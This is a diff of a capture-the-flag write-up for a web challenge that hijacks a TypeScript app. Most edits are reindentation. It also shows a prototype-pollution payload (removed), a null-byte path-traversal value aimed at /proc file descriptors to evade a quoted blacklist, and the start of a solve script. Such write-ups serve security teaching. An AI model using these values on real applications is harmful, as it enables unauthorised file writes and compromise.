@@ -11,14 +11,14 @@ description: Hijacking the main application
 
 ```ts [index.ts]
 const getSignedData = (data: any): any => {
-  const signedParams: any = {};
-  for (const param in data) {
-    if (param.startsWith(SIGNED_PREFIX)) {
-      const keyName = param.slice(SIGNED_PREFIX.length);
-      signedParams[keyName] = data[param];
+    const signedParams: any = {};
+    for (const param in data) {
+        if (param.startsWith(SIGNED_PREFIX)) {
+            const keyName = param.slice(SIGNED_PREFIX.length);
+            signedParams[keyName] = data[param];
+        }
     }
-  }
-  return signedParams;
+    return signedParams;
 };
 ```
 
@@ -35,8 +35,8 @@ const outputFile = `${outputPrefix}-${randomBytes(8).toString("hex")}.yaml`;
 ```ts
 const json = JSON.parse(readFileSync(fullPath).toString());
 prisoners.push({
-  data: json,
-  signature: getSignature(getSignedData(json))
+    data: json,
+    signature: getSignature(getSignedData(json))
 });
 ```
 
@@ -59,6 +59,7 @@ done
 ```
 
 - This is inviting a crush.
+
 ## Attack
 
 ### Custom File Name
@@ -80,7 +81,7 @@ It worked, use null terminator to end the file path prematurely to get rid of th
 
 ```ts
 const BANNED_STRINGS = [
-  "app", "src", ".ts", "node", "package", "bun", "home", "etc", "usr", "opt", "tmp", "index", ".sh"
+    "app", "src", ".ts", "node", "package", "bun", "home", "etc", "usr", "opt", "tmp", "index", ".sh"
 ];
 ```
 
@@ -89,10 +90,10 @@ Everything is great but how do we escape the blacklist?
 > My teammate @spipm, was the one who came up with the exact execution of the bypass..
 > I got stuck playing with path traversal.
 
-```python
-d['data']['signed.__proto__'] = {
-    "outputPrefix": "../../proc/9/fd/3\u0000"
-}
+The solution is with proc.
+
+```
+"outputPrefix": "../../proc/9/fd/3\u0000"
 ```
 
 You can find `/proc` targets via the following command.
@@ -143,7 +144,7 @@ find: '/proc/91/fd/6': No such file or directory
 
 ## Solve Script
 
-```python
+```python [solve.py]
 import requests
 s = requests.Session()
 target = "https://web-prisoner-processor-3bdc15af869668aa.2024.ductf.dev"
